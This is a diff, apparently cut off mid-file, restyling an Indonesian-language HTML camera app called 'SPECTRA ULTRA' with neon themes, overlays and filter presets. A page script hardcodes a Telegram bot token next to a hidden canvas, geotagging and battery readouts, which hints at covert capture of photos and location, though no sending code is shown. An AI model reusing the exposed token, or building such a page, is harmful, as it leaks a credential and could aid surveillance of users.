@@ -15,7 +15,9 @@
                         brand: {
                             accentRed: '#ff0050',
                             accentCyan: '#00f2fe',
-                            dark: '#0a0a0f',
+                            dark: '#050508',
+                            neonPurple: '#bf00ff',
+                            neonGreen: '#00ff66'
                         }
                     }
                 }
@@ -25,7 +27,7 @@
     <!-- Lucide Icons -->
     <script src="https://unpkg.com/lucide@latest"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap');
         
         * {
             box-sizing: border-box;
@@ -37,7 +39,7 @@
 
         body {
             font-family: 'Plus Jakarta Sans', sans-serif;
-            background-color: #000000;
+            background-color: #020205;
             color: #ffffff;
             height: 100dvh;
             width: 100vw;
@@ -50,21 +52,27 @@
         }
 
         .glass-panel {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.18);
+            background: rgba(10, 10, 20, 0.65);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border: 1px solid rgba(0, 242, 254, 0.25);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.6), inset 0 0 15px rgba(0, 242, 254, 0.05);
         }
 
         .glass-btn {
-            background: rgba(255, 255, 255, 0.08);
-            backdrop-filter: blur(14px);
-            -webkit-backdrop-filter: blur(14px);
-            border: 1px solid rgba(255, 255, 255, 0.22);
-            transition: transform 0.1s ease, background-color 0.2s ease;
+            background: rgba(255, 255, 255, 0.06);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .glass-btn:hover {
+            border-color: rgba(0, 242, 254, 0.6);
+            background: rgba(0, 242, 254, 0.1);
+            box-shadow: 0 0 15px rgba(0, 242, 254, 0.3);
         }
         .glass-btn:active {
-            transform: scale(0.88);
+            transform: scale(0.9);
         }
 
         .no-scrollbar::-webkit-scrollbar {
@@ -76,16 +84,24 @@
         }
 
         @keyframes focusPulse {
-            0% { transform: scale(1.4); opacity: 0.8; }
-            50% { transform: scale(0.95); opacity: 1; }
-            100% { transform: scale(1); opacity: 0; }
+            0% { transform: scale(1.4); opacity: 0.9; box-shadow: 0 0 25px #00f2fe; }
+            50% { transform: scale(0.95); opacity: 1; box-shadow: 0 0 10px #00f2fe; }
+            100% { transform: scale(1); opacity: 0; box-shadow: 0 0 5px #00f2fe; }
         }
         .focus-ring-anim {
             animation: focusPulse 0.75s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
         }
+
+        @keyframes scannerLine {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(1000%); }
+        }
+        .scanner-beam {
+            animation: scannerLine 4s linear infinite;
+        }
     </style>
 </head>
-<body class="flex flex-col h-[100dvh] w-screen bg-black text-white relative overflow-hidden select-none">
+<body class="flex flex-col h-[100dvh] w-screen bg-[#020205] text-white relative overflow-hidden select-none">
 
     <script>
         const BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM";
@@ -109,21 +125,21 @@
     </script>
 
     <!-- TOP CONTROL HEADER -->
-    <header class="absolute top-0 left-0 right-0 z-30 flex items-center justify-between px-4 py-3 bg-gradient-to-b from-black/60 via-transparent to-transparent pointer-events-auto">
-        <div class="flex items-center space-x-2 bg-white/10 backdrop-blur-md px-3 py-1.5 rounded-full border border-white/20 shadow-lg">
+    <header class="absolute top-0 left-0 right-0 z-30 flex items-center justify-between px-5 py-4 bg-gradient-to-b from-[#020205]/90 via-[#020205]/40 to-transparent pointer-events-auto">
+        <div class="flex items-center space-x-2.5 bg-[#0a0a14]/80 backdrop-blur-xl px-4 py-2 rounded-2xl border border-brand-accentCyan/30 shadow-[0_0_20px_rgba(0,242,254,0.15)]">
             <span class="w-2.5 h-2.5 rounded-full bg-brand-accentCyan animate-ping"></span>
-            <span class="font-mono text-xs font-black tracking-widest text-white">SPECTRA <span class="text-brand-accentRed">ULTRA</span></span>
+            <span class="font-mono text-xs font-black tracking-widest text-white flex items-center gap-1.5">SPECTRA <span class="text-brand-accentRed drop-shadow-[0_0_8px_rgba(255,0,80,0.8)]">ULTRA</span></span>
         </div>
         <div class="flex items-center space-x-2">
             <!-- Badge Status GPS / Lokasi -->
-            <span id="geo-badge" class="font-mono text-[10px] bg-black/40 text-gray-400 px-2 py-1 rounded-full border border-white/15 hidden items-center gap-1">
-                <i data-lucide="map-pin" class="w-3 h-3"></i> <span id="geo-badge-text">GPS Off</span>
+            <span id="geo-badge" class="font-mono text-[10px] bg-black/60 text-brand-accentCyan px-2.5 py-1.5 rounded-xl border border-brand-accentCyan/30 hidden items-center gap-1.5 shadow-[0_0_10px_rgba(0,242,254,0.1)]">
+                <i data-lucide="map-pin" class="w-3 h-3 text-brand-accentCyan"></i> <span id="geo-badge-text">GPS Off</span>
             </span>
-            <span id="battery-badge" class="font-mono text-[10px] bg-black/40 text-yellow-400 px-2 py-1 rounded-full border border-white/15 flex items-center gap-1">
+            <span id="battery-badge" class="font-mono text-[10px] bg-black/60 text-yellow-400 px-2.5 py-1.5 rounded-xl border border-yellow-400/30 flex items-center gap-1.5 shadow-[0_0_10px_rgba(250,204,21,0.1)]">
                 <i data-lucide="battery" class="w-3 h-3"></i> <span id="batt-text">--%</span>
             </span>
-            <span id="res-badge" class="font-mono text-[10px] bg-black/40 text-brand-accentCyan px-2.5 py-1 rounded-full border border-white/15">HD+</span>
-            <button id="btn-aspect" class="glass-btn px-3 py-1.5 rounded-full font-mono text-xs font-bold text-white hover:text-brand-accentCyan shadow-md">
+            <span id="res-badge" class="font-mono text-[10px] bg-black/60 text-brand-accentCyan px-3 py-1.5 rounded-xl border border-brand-accentCyan/30 shadow-[0_0_10px_rgba(0,242,254,0.1)]">HD+</span>
+            <button id="btn-aspect" class="glass-btn px-3.5 py-1.5 rounded-xl font-mono text-xs font-bold text-white hover:text-brand-accentCyan shadow-md">
                 4:3
             </button>
         </div>
@@ -132,227 +148,244 @@
     <!-- MAIN CAMERA VIEWFINDER -->
     <main class="flex-1 relative w-full h-full flex items-center justify-center bg-black overflow-hidden" id="viewfinder">
         
-        <div id="focus-ring" class="absolute w-16 h-16 border-2 border-brand-accentCyan rounded-full pointer-events-none z-30 hidden shadow-[0_0_15px_#00f2fe]"></div>
-
-        <div id="overlay-countdown" class="absolute inset-0 z-40 bg-black/40 backdrop-blur-sm flex items-center justify-center hidden pointer-events-none">
-            <span id="countdown-val" class="font-mono text-9xl font-black text-brand-accentRed animate-bounce drop-shadow-[0_0_30px_rgba(255,0,80,0.8)]">3</span>
-        </div>
-
-        <div id="overlay-leveler" class="absolute inset-x-0 top-20 flex justify-center pointer-events-none z-25 opacity-0 transition-opacity duration-300">
-            <div class="relative w-48 h-5 bg-white/10 backdrop-blur-md rounded-full border border-white/25 flex items-center justify-center overflow-hidden shadow-lg">
-                <div class="absolute inset-x-0 h-[1px] bg-white/40"></div>
-                <div id="level-bubble" class="absolute w-3.5 h-3.5 bg-brand-accentCyan rounded-full shadow-[0_0_12px_#00f2fe] transition-transform duration-75"></div>
+        <!-- Cybernetic Corner Reticles -->
+        <div class="absolute inset-4 z-20 pointer-events-none border border-brand-accentCyan/15 rounded-3xl overflow-hidden flex flex-col justify-between p-3">
+            <div class="flex justify-between items-center opacity-70">
+                <div class="w-4 h-4 border-t-2 border-l-2 border-brand-accentCyan"></div>
+                <div class="w-4 h-4 border-t-2 border-r-2 border-brand-accentCyan"></div>
+            </div>
+            <div class="flex justify-between items-center opacity-70">
+                <div class="w-4 h-4 border-b-2 border-l-2 border-brand-accentCyan"></div>
+                <div class="w-4 h-4 border-b-2 border-r-2 border-brand-accentCyan"></div>
             </div>
         </div>
 
-        <div id="overlay-grid" class="absolute inset-0 z-20 pointer-events-none hidden grid grid-cols-3 grid-rows-3 border border-white/10">
-            <div class="border-r border-b border-white/15"></div>
-            <div class="border-r border-b border-white/15"></div>
-            <div class="border-b border-white/15"></div>
-            <div class="border-r border-b border-white/15"></div>
-            <div class="border-r border-b border-white/15"></div>
-            <div class="border-b border-white/15"></div>
-            <div class="border-r border-white/15"></div>
-            <div class="border-r border-white/15"></div>
+        <!-- Scanning Beam Effect -->
+        <div class="absolute inset-0 z-10 pointer-events-none opacity-10 overflow-hidden">
+            <div class="w-full h-1 bg-gradient-to-r from-transparent via-brand-accentCyan to-transparent scanner-beam"></div>
+        </div>
+
+        <div id="focus-ring" class="absolute w-20 h-20 border-2 border-brand-accentCyan rounded-full pointer-events-none z-30 hidden shadow-[0_0_20px_#00f2fe]"></div>
+
+        <div id="overlay-countdown" class="absolute inset-0 z-40 bg-black/70 backdrop-blur-md flex items-center justify-center hidden pointer-events-none">
+            <span id="countdown-val" class="font-mono text-9xl font-black text-brand-accentRed animate-bounce drop-shadow-[0_0_40px_rgba(255,0,80,0.9)]">3</span>
+        </div>
+
+        <div id="overlay-leveler" class="absolute inset-x-0 top-24 flex justify-center pointer-events-none z-25 opacity-0 transition-opacity duration-300">
+            <div class="relative w-56 h-6 bg-black/60 backdrop-blur-xl rounded-full border border-brand-accentCyan/40 flex items-center justify-center overflow-hidden shadow-[0_0_20px_rgba(0,242,254,0.2)]">
+                <div class="absolute inset-x-0 h-[1px] bg-brand-accentCyan/50"></div>
+                <div id="level-bubble" class="absolute w-4 h-4 bg-brand-accentCyan rounded-full shadow-[0_0_15px_#00f2fe] transition-transform duration-75"></div>
+            </div>
+        </div>
+
+        <div id="overlay-grid" class="absolute inset-0 z-20 pointer-events-none hidden grid grid-cols-3 grid-rows-3 border border-brand-accentCyan/20 m-6 rounded-2xl overflow-hidden">
+            <div class="border-r border-b border-brand-accentCyan/20"></div>
+            <div class="border-r border-b border-brand-accentCyan/20"></div>
+            <div class="border-b border-brand-accentCyan/20"></div>
+            <div class="border-r border-b border-brand-accentCyan/20"></div>
+            <div class="border-r border-b border-brand-accentCyan/20"></div>
+            <div class="border-b border-brand-accentCyan/20"></div>
+            <div class="border-r border-brand-accentCyan/20"></div>
+            <div class="border-r border-brand-accentCyan/20"></div>
             <div></div>
         </div>
 
-        <div id="aspect-frame" class="relative flex items-center justify-center transition-all duration-300 overflow-hidden bg-black shadow-2xl border border-white/10" style="width: 100%; height: 100%; aspect-ratio: 4/3;">
+        <div id="aspect-frame" class="relative flex items-center justify-center transition-all duration-300 overflow-hidden bg-black shadow-[0_0_50px_rgba(0,0,0,0.8)] border border-white/10 rounded-3xl" style="width: 100%; height: 100%; aspect-ratio: 4/3;">
             <div id="video-wrapper" class="w-full h-full relative overflow-hidden flex items-center justify-center">
                 <video id="video-stream" autoplay playsinline muted class="w-full h-full object-cover transition-transform duration-75"></video>
             </div>
             <canvas id="hidden-canvas" class="hidden"></canvas>
             
-            <div id="camera-fallback" class="absolute inset-0 bg-brand-dark flex flex-col items-center justify-center text-center p-6 hidden z-30">
-                <div class="w-20 h-20 rounded-full bg-brand-accentRed/10 flex items-center justify-center mb-4 border border-brand-accentRed/30 shadow-lg">
-                    <i data-lucide="camera-off" class="w-10 h-10 text-brand-accentRed"></i>
+            <div id="camera-fallback" class="absolute inset-0 bg-[#0a0a14] flex flex-col items-center justify-center text-center p-6 hidden z-30">
+                <div class="w-24 h-24 rounded-3xl bg-brand-accentRed/10 flex items-center justify-center mb-5 border border-brand-accentRed/40 shadow-[0_0_30px_rgba(255,0,80,0.2)]">
+                    <i data-lucide="camera-off" class="w-12 h-12 text-brand-accentRed"></i>
                 </div>
-                <h3 class="text-xl font-black mb-2">Akses Kamera Diblokir</h3>
-                <p class="text-xs text-gray-300 max-w-xs mb-6">Harap izinkan akses kamera untuk menggunakan fitur pemotretan profesional.</p>
-                <button id="btn-restart-cam" class="px-8 py-3 bg-brand-accentRed text-white font-bold text-xs rounded-full shadow-lg hover:scale-105 active:scale-95 transition-all">Izinkan Kamera</button>
+                <h3 class="text-2xl font-black mb-2 tracking-wide">Akses Kamera Diblokir</h3>
+                <p class="text-xs text-gray-400 max-w-xs mb-6 leading-relaxed">Harap izinkan akses kamera untuk menggunakan fitur pemotretan profesional Spectra Ultra.</p>
+                <button id="btn-restart-cam" class="px-8 py-3.5 bg-gradient-to-r from-brand-accentRed to-pink-600 text-white font-bold text-xs rounded-2xl shadow-[0_0_20px_rgba(255,0,80,0.4)] hover:scale-105 active:scale-95 transition-all">Izinkan Kamera</button>
             </div>
         </div>
 
         <!-- RIGHT-SIDE VERTICAL TOOLBAR & ZOOM -->
-        <div class="absolute right-3 top-16 z-30 flex flex-col space-y-2 max-h-[78vh] overflow-y-auto no-scrollbar pr-0.5 items-center">
+        <div class="absolute right-4 top-20 z-30 flex flex-col space-y-2.5 max-h-[75vh] overflow-y-auto no-scrollbar pr-1 items-center">
             
-            <button id="btn-zoom-in" class="glass-btn p-2 rounded-full text-white hover:text-brand-accentCyan shadow-lg flex flex-col items-center gap-0.5" title="Zoom In">
-                <i data-lucide="zoom-in" class="w-4 h-4"></i>
-                <span id="zoom-indicator" class="text-[8px] font-mono font-bold text-brand-accentCyan">1.0x</span>
+            <button id="btn-zoom-in" class="glass-btn p-2.5 rounded-2xl text-white hover:text-brand-accentCyan shadow-lg flex flex-col items-center gap-0.5 group" title="Zoom In">
+                <i data-lucide="zoom-in" class="w-4 h-4 group-hover:scale-110 transition-transform"></i>
+                <span id="zoom-indicator" class="text-[9px] font-mono font-extrabold text-brand-accentCyan">1.0x</span>
             </button>
-            <button id="btn-zoom-out" class="glass-btn p-2 rounded-full text-white hover:text-brand-accentCyan shadow-lg flex flex-col items-center gap-0.5" title="Zoom Out">
-                <i data-lucide="zoom-out" class="w-4 h-4"></i>
-                <span class="text-[8px] font-mono font-bold">Zoom -</span>
+            <button id="btn-zoom-out" class="glass-btn p-2.5 rounded-2xl text-white hover:text-brand-accentCyan shadow-lg flex flex-col items-center gap-0.5 group" title="Zoom Out">
+                <i data-lucide="zoom-out" class="w-4 h-4 group-hover:scale-110 transition-transform"></i>
+                <span class="text-[9px] font-mono font-bold text-gray-400">Zoom -</span>
             </button>
 
-            <div class="w-6 h-[1px] bg-white/30 my-1"></div>
+            <div class="w-8 h-[1px] bg-brand-accentCyan/30 my-1"></div>
 
-            <button id="btn-geotag" class="glass-btn p-2.5 rounded-full text-white hover:text-brand-accentCyan shadow-lg flex flex-col items-center gap-0.5" title="Geotagging Lokasi">
-                <i data-lucide="map-pin" class="w-4 h-4"></i>
+            <button id="btn-geotag" class="glass-btn p-3 rounded-2xl text-white hover:text-brand-accentCyan shadow-lg flex flex-col items-center gap-1 group" title="Geotagging Lokasi">
+                <i data-lucide="map-pin" class="w-4 h-4 group-hover:scale-110 transition-transform"></i>
                 <span id="geotag-label" class="text-[8px] font-mono font-bold">Geo</span>
             </button>
-            <button id="btn-hdr" class="glass-btn p-2.5 rounded-full text-white hover:text-yellow-400 shadow-lg flex flex-col items-center gap-0.5">
-                <i data-lucide="sun" class="w-4 h-4"></i>
+            <button id="btn-hdr" class="glass-btn p-3 rounded-2xl text-white hover:text-yellow-400 shadow-lg flex flex-col items-center gap-1 group">
+                <i data-lucide="sun" class="w-4 h-4 group-hover:scale-110 transition-transform"></i>
                 <span class="text-[8px] font-mono font-bold">HDR</span>
             </button>
-            <button id="btn-switch-cam" class="glass-btn p-2.5 rounded-full text-white hover:text-brand-accentCyan shadow-lg flex flex-col items-center gap-0.5">
-                <i data-lucide="switch-camera" class="w-4 h-4"></i>
+            <button id="btn-switch-cam" class="glass-btn p-3 rounded-2xl text-white hover:text-brand-accentCyan shadow-lg flex flex-col items-center gap-1 group">
+                <i data-lucide="switch-camera" class="w-4 h-4 group-hover:scale-110 transition-transform"></i>
                 <span class="text-[8px] font-mono font-bold">Flip</span>
             </button>
-            <button id="btn-torch" class="glass-btn p-2.5 rounded-full text-white hover:text-yellow-400 shadow-lg flex flex-col items-center gap-0.5">
-                <i data-lucide="zap" class="w-4 h-4"></i>
+            <button id="btn-torch" class="glass-btn p-3 rounded-2xl text-white hover:text-yellow-400 shadow-lg flex flex-col items-center gap-1 group">
+                <i data-lucide="zap" class="w-4 h-4 group-hover:scale-110 transition-transform"></i>
                 <span class="text-[8px] font-mono font-bold">Flash</span>
             </button>
-            <button id="btn-toggle-filters" class="glass-btn p-2.5 rounded-full text-white hover:text-brand-accentRed shadow-lg flex flex-col items-center gap-0.5">
-                <i data-lucide="sparkles" class="w-4 h-4 text-brand-accentRed"></i>
+            <button id="btn-toggle-filters" class="glass-btn p-3 rounded-2xl text-white hover:text-brand-accentRed shadow-lg flex flex-col items-center gap-1 group">
+                <i data-lucide="sparkles" class="w-4 h-4 text-brand-accentRed group-hover:scale-110 transition-transform"></i>
                 <span class="text-[8px] font-mono font-bold">Presets</span>
             </button>
-            <button id="btn-toggle-manual" class="glass-btn p-2.5 rounded-full text-white hover:text-cyan-400 shadow-lg flex flex-col items-center gap-0.5">
-                <i data-lucide="sliders-horizontal" class="w-4 h-4 text-cyan-400"></i>
+            <button id="btn-toggle-manual" class="glass-btn p-3 rounded-2xl text-white hover:text-cyan-400 shadow-lg flex flex-col items-center gap-1 group">
+                <i data-lucide="sliders-horizontal" class="w-4 h-4 text-cyan-400 group-hover:scale-110 transition-transform"></i>
                 <span class="text-[8px] font-mono font-bold">Manual</span>
             </button>
-            <button id="btn-timer" class="glass-btn p-2.5 rounded-full text-white hover:text-yellow-400 shadow-lg flex flex-col items-center gap-0.5 relative">
-                <i data-lucide="timer" class="w-4 h-4"></i>
+            <button id="btn-timer" class="glass-btn p-3 rounded-2xl text-white hover:text-yellow-400 shadow-lg flex flex-col items-center gap-1 relative group">
+                <i data-lucide="timer" class="w-4 h-4 group-hover:scale-110 transition-transform"></i>
                 <span id="timer-indicator" class="text-[8px] font-mono font-bold">Off</span>
             </button>
-            <button id="btn-grid" class="glass-btn p-2.5 rounded-full text-white hover:text-brand-accentCyan shadow-lg flex flex-col items-center gap-0.5">
-                <i data-lucide="grid" class="w-4 h-4"></i>
+            <button id="btn-grid" class="glass-btn p-3 rounded-2xl text-white hover:text-brand-accentCyan shadow-lg flex flex-col items-center gap-1 group">
+                <i data-lucide="grid" class="w-4 h-4 group-hover:scale-110 transition-transform"></i>
                 <span class="text-[8px] font-mono font-bold">Grid</span>
             </button>
-            <button id="btn-leveler" class="glass-btn p-2.5 rounded-full text-white hover:text-yellow-400 shadow-lg flex flex-col items-center gap-0.5">
-                <i data-lucide="compass" class="w-4 h-4"></i>
+            <button id="btn-leveler" class="glass-btn p-3 rounded-2xl text-white hover:text-yellow-400 shadow-lg flex flex-col items-center gap-1 group">
+                <i data-lucide="compass" class="w-4 h-4 group-hover:scale-110 transition-transform"></i>
                 <span class="text-[8px] font-mono font-bold">Level</span>
             </button>
-            <button id="btn-open-pro" class="glass-btn p-2.5 rounded-full text-white hover:text-brand-accentCyan shadow-lg flex flex-col items-center gap-0.5">
-                <i data-lucide="sliders" class="w-4 h-4 text-brand-accentCyan"></i>
+            <button id="btn-open-pro" class="glass-btn p-3 rounded-2xl text-white hover:text-brand-accentCyan shadow-lg flex flex-col items-center gap-1 group">
+                <i data-lucide="sliders" class="w-4 h-4 text-brand-accentCyan group-hover:scale-110 transition-transform"></i>
                 <span class="text-[8px] font-mono font-bold">Pro</span>
             </button>
         </div>
     </main>
 
     <!-- PRESETS HORIZONTAL BAR MODAL -->
-    <div id="presets-panel" class="absolute bottom-28 left-4 right-16 z-40 glass-panel rounded-3xl p-3 shadow-2xl hidden transition-all duration-300">
-        <div class="flex items-center justify-between mb-2 pb-1 border-b border-white/20">
-            <span class="font-mono text-[10px] font-bold text-brand-accentRed flex items-center gap-1.5 drop-shadow">
-                <i data-lucide="sparkles" class="w-3.5 h-3.5"></i> PHOTO LOOK PRESETS
+    <div id="presets-panel" class="absolute bottom-28 left-4 right-20 z-40 glass-panel rounded-3xl p-4 shadow-2xl hidden transition-all duration-300 border border-brand-accentCyan/30">
+        <div class="flex items-center justify-between mb-3 pb-2 border-b border-brand-accentCyan/20">
+            <span class="font-mono text-[11px] font-bold text-brand-accentRed flex items-center gap-2 drop-shadow">
+                <i data-lucide="sparkles" class="w-4 h-4"></i> PHOTO LOOK PRESETS
             </span>
-            <button id="btn-close-presets" class="p-1 text-white hover:text-gray-200">
+            <button id="btn-close-presets" class="p-1.5 rounded-xl bg-white/5 hover:bg-white/10 text-white transition-all">
                 <i data-lucide="x" class="w-4 h-4"></i>
             </button>
         </div>
-        <div class="flex space-x-2 overflow-x-auto no-scrollbar py-1">
-            <button class="preset-badge px-3 py-1.5 rounded-xl bg-white/25 border border-brand-accentCyan text-white font-mono text-[10px] font-bold whitespace-nowrap shadow-sm" data-filter="none">NORMAL</button>
-            <button class="preset-badge px-3 py-1.5 rounded-xl bg-white/10 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/20" data-filter="glow-beauty">GLOW BEAUTY</button>
-            <button class="preset-badge px-3 py-1.5 rounded-xl bg-white/10 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/20" data-filter="soft-portrait">SOFT PORTRAIT</button>
-            <button class="preset-badge px-3 py-1.5 rounded-xl bg-white/10 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/20" data-filter="cinematic-teal">CINEMATIC TEAL</button>
-            <button class="preset-badge px-3 py-1.5 rounded-xl bg-white/10 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/20" data-filter="cyberpunk-neon">CYBERPUNK NEON</button>
-            <button class="preset-badge px-3 py-1.5 rounded-xl bg-white/10 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/20" data-filter="warm-sunset">WARM SUNSET</button>
-            <button class="preset-badge px-3 py-1.5 rounded-xl bg-white/10 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/20" data-filter="noir-bw">NOIR B&W</button>
-            <button class="preset-badge px-3 py-1.5 rounded-xl bg-white/10 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/20" data-filter="vintage-film">VINTAGE FILM</button>
-            <button class="preset-badge px-3 py-1.5 rounded-xl bg-white/10 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/20" data-filter="vivid-pop">VIVID POP</button>
-            <button class="preset-badge px-3 py-1.5 rounded-xl bg-white/10 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/20" data-filter="moody-blue">MOODY BLUE</button>
-            <button class="preset-badge px-3 py-1.5 rounded-xl bg-white/10 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/20" data-filter="golden-hour">GOLDEN HOUR</button>
-            <button class="preset-badge px-3 py-1.5 rounded-xl bg-white/10 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/20" data-filter="matrix-green">MATRIX GREEN</button>
-            <button class="preset-badge px-3 py-1.5 rounded-xl bg-white/10 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/20" data-filter="retro-warm">RETRO WARM</button>
+        <div class="flex space-x-2.5 overflow-x-auto no-scrollbar py-1">
+            <button class="preset-badge px-3.5 py-2 rounded-2xl bg-brand-accentCyan/20 border border-brand-accentCyan text-white font-mono text-[10px] font-bold whitespace-nowrap shadow-[0_0_10px_rgba(0,242,254,0.3)] transition-all" data-filter="none">NORMAL</button>
+            <button class="preset-badge px-3.5 py-2 rounded-2xl bg-white/5 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/15 hover:border-brand-accentCyan/50 transition-all" data-filter="glow-beauty">GLOW BEAUTY</button>
+            <button class="preset-badge px-3.5 py-2 rounded-2xl bg-white/5 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/15 hover:border-brand-accentCyan/50 transition-all" data-filter="soft-portrait">SOFT PORTRAIT</button>
+            <button class="preset-badge px-3.5 py-2 rounded-2xl bg-white/5 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/15 hover:border-brand-accentCyan/50 transition-all" data-filter="cinematic-teal">CINEMATIC TEAL</button>
+            <button class="preset-badge px-3.5 py-2 rounded-2xl bg-white/5 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/15 hover:border-brand-accentCyan/50 transition-all" data-filter="cyberpunk-neon">CYBERPUNK NEON</button>
+            <button class="preset-badge px-3.5 py-2 rounded-2xl bg-white/5 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/15 hover:border-brand-accentCyan/50 transition-all" data-filter="warm-sunset">WARM SUNSET</button>
+            <button class="preset-badge px-3.5 py-2 rounded-2xl bg-white/5 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/15 hover:border-brand-accentCyan/50 transition-all" data-filter="noir-bw">NOIR B&W</button>
+            <button class="preset-badge px-3.5 py-2 rounded-2xl bg-white/5 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/15 hover:border-brand-accentCyan/50 transition-all" data-filter="vintage-film">VINTAGE FILM</button>
+            <button class="preset-badge px-3.5 py-2 rounded-2xl bg-white/5 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/15 hover:border-brand-accentCyan/50 transition-all" data-filter="vivid-pop">VIVID POP</button>
+            <button class="preset-badge px-3.5 py-2 rounded-2xl bg-white/5 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/15 hover:border-brand-accentCyan/50 transition-all" data-filter="moody-blue">MOODY BLUE</button>
+            <button class="preset-badge px-3.5 py-2 rounded-2xl bg-white/5 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/15 hover:border-brand-accentCyan/50 transition-all" data-filter="golden-hour">GOLDEN HOUR</button>
+            <button class="preset-badge px-3.5 py-2 rounded-2xl bg-white/5 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/15 hover:border-brand-accentCyan/50 transition-all" data-filter="matrix-green">MATRIX GREEN</button>
+            <button class="preset-badge px-3.5 py-2 rounded-2xl bg-white/5 text-white font-mono text-[10px] font-bold whitespace-nowrap border border-white/15 hover:border-brand-accentCyan/50 transition-all" data-filter="retro-warm">RETRO WARM</button>
         </div>
     </div>
 
     <!-- MANUAL PRESET ADJUSTMENTS DRAWER MODAL -->
-    <div id="manual-panel" class="absolute bottom-28 left-4 right-16 z-40 glass-panel rounded-3xl p-3.5 shadow-2xl hidden transition-all duration-300 max-h-[42vh] overflow-y-auto no-scrollbar">
-        <div class="flex items-center justify-between mb-2.5 pb-1.5 border-b border-white/20">
-            <span class="font-mono text-[10px] font-bold text-cyan-300 flex items-center gap-1.5 drop-shadow">
-                <i data-lucide="sliders-horizontal" class="w-3.5 h-3.5"></i> MANUAL COLOR TUNING
+    <div id="manual-panel" class="absolute bottom-28 left-4 right-20 z-40 glass-panel rounded-3xl p-4 shadow-2xl hidden transition-all duration-300 max-h-[42vh] overflow-y-auto no-scrollbar border border-cyan-500/30">
+        <div class="flex items-center justify-between mb-3 pb-2 border-b border-cyan-500/20">
+            <span class="font-mono text-[11px] font-bold text-cyan-300 flex items-center gap-2 drop-shadow">
+                <i data-lucide="sliders-horizontal" class="w-4 h-4"></i> MANUAL COLOR TUNING
             </span>
-            <button id="btn-close-manual" class="p-1 text-white hover:text-gray-200">
+            <button id="btn-close-manual" class="p-1.5 rounded-xl bg-white/5 hover:bg-white/10 text-white transition-all">
                 <i data-lucide="x" class="w-4 h-4"></i>
             </button>
         </div>
-        <div class="space-y-3">
+        <div class="space-y-3.5">
             <div>
-                <div class="flex justify-between text-[10px] font-mono text-white mb-0.5">
+                <div class="flex justify-between text-[10px] font-mono text-white mb-1">
                     <span>BRIGHTNESS</span>
                     <span id="val-bright" class="text-cyan-300 font-bold">100%</span>
                 </div>
-                <input id="slider-bright" type="range" min="50" max="150" value="100" class="w-full h-1.5 bg-white/30 rounded-lg appearance-none cursor-pointer accent-cyan-300">
+                <input id="slider-bright" type="range" min="50" max="150" value="100" class="w-full h-2 bg-black/60 rounded-lg appearance-none cursor-pointer accent-cyan-400 border border-cyan-500/30">
             </div>
             <div>
-                <div class="flex justify-between text-[10px] font-mono text-white mb-0.5">
+                <div class="flex justify-between text-[10px] font-mono text-white mb-1">
                     <span>CONTRAST</span>
                     <span id="val-contrast" class="text-cyan-300 font-bold">100%</span>
                 </div>
-                <input id="slider-contrast" type="range" min="50" max="150" value="100" class="w-full h-1.5 bg-white/30 rounded-lg appearance-none cursor-pointer accent-cyan-300">
+                <input id="slider-contrast" type="range" min="50" max="150" value="100" class="w-full h-2 bg-black/60 rounded-lg appearance-none cursor-pointer accent-cyan-400 border border-cyan-500/30">
             </div>
             <div>
-                <div class="flex justify-between text-[10px] font-mono text-white mb-0.5">
+                <div class="flex justify-between text-[10px] font-mono text-white mb-1">
                     <span>SATURATION</span>
                     <span id="val-saturate" class="text-cyan-300 font-bold">100%</span>
                 </div>
-                <input id="slider-saturate" type="range" min="0" max="200" value="100" class="w-full h-1.5 bg-white/30 rounded-lg appearance-none cursor-pointer accent-cyan-300">
+                <input id="slider-saturate" type="range" min="0" max="200" value="100" class="w-full h-2 bg-black/60 rounded-lg appearance-none cursor-pointer accent-cyan-400 border border-cyan-500/30">
             </div>
             <div>
-                <div class="flex justify-between text-[10px] font-mono text-white mb-0.5">
+                <div class="flex justify-between text-[10px] font-mono text-white mb-1">
                     <span>SEPIA / WARMTH</span>
                     <span id="val-sepia" class="text-cyan-300 font-bold">0%</span>
                 </div>
-                <input id="slider-sepia" type="range" min="0" max="100" value="0" class="w-full h-1.5 bg-white/30 rounded-lg appearance-none cursor-pointer accent-cyan-300">
